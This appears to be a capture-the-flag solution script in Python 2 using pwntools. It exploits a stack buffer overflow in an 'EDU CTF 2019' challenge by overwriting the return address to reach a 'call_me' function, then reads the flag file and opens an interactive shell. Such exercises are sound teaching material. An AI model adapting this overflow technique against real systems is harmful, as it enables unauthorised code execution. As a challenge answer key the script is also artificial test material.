#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *


context.arch = 'amd64'


# r = process('./bof-da5035445d5981d61fe775c3894f06ff')
r = remote('edu-ctf.csie.org', 10170)


ret = 0x400546
call_me = 0x400687
payload = 'a'*0x30 + 'b'*8 + p64(ret) + p64(call_me)

r.recvuntil('Welcome to EDU CTF 2019.\n')
r.sendline(payload)
r.sendline('cat /home/bof/flag')
r.interactive()
